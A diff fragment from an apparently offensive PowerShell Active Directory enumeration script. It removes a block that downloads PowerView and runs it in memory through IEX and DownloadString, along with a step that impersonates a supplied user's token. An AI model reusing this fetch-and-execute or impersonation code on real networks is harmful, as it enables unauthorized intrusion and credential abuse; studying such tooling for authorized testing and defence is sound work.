@@ -129,26 +129,6 @@ Param(
 
 	$Summary = $null
 	
-	#Download PowerView from specified URL or from GitHub.
-	try {
-		Write-Host "[>]Downloading Powerview | " -NoNewLine
-			Write-Host "$PowerViewURL | " -NoNewLine
-			IEX $webclient.DownloadString($PowerViewURL)
-			Write-Host "Success" -ForegroundColor Green
-		}
-	}catch {Write-Host "Error: Are You Using The Dev Branch of Powerview? $_.Exception.GetType().FullName" -ForegroundColor Red; Return}
-
-	#Uses PowerView to create a new "runas /netonly" type logon and impersonate the token.
-	if ($Credential -ne [System.Management.Automation.PSCredential]::Empty){
-		try{
-			$NetworkCredential = $Credential.GetNetworkCredential()
-			$Domain = $NetworkCredential.Domain
-			$UserName = $NetworkCredential.UserName
-			Write-Host "Impersonate user: $Domain\$Username | " -NoNewLine
-			$Null = Invoke-UserImpersonation -Credential $Credential
-			Write-Host "Success" -ForegroundColor Green 
-		}catch{Write-Host "Error: Are You Using The Dev Branch of Powerview? $_.Exception.GetType().FullName" -ForegroundColor Red; Return}
-	}	
 
 	#Grab Local Domain
 	Write-Host "Enumeration Domain: " -ForegroundColor Cyan -NoNewLine
